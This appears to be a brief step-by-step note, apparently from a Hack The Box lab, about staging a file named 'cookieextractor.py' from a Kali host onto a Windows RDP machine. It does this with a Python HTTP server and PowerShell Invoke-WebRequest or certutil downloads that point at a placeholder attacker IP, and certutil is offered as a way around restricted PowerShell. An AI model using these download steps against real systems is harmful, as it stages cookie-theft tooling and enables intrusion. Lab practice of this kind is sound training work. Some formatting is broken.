# ✅ OPTION 1 (BEST): Python HTTP server + PowerShell (recommended)

### 🔹 On **Kali** (where `cookieextractor.py` is)

Go to the directory that contains the file:

`cd ~/Desktop`

Start a simple web server:

`python3 -m http.server 8000`

Leave this running.

---

### 🔹 On the **RDP machine (Grace / PowerShell)**

Download the file:

`cd C:\Users\grace\Desktop

```powershell
Invoke-WebRequest http://<KALI_IP>:8000/cookieextractor.py -OutFile cookieextractor.py
```

Example:

``

✅ Done.

Verify:

`dir`

---

# ✅ OPTION 2: certutil (works even if PowerShell is restricted)

### On **RDP machine (CMD or PowerShell)**:

cd C:\Users\grace\Desktop 

certutil -urlcache -split -f http://<KALI_IP>:8000/cookieextractor.py cookieextractor.py

This is **very common in HTB**.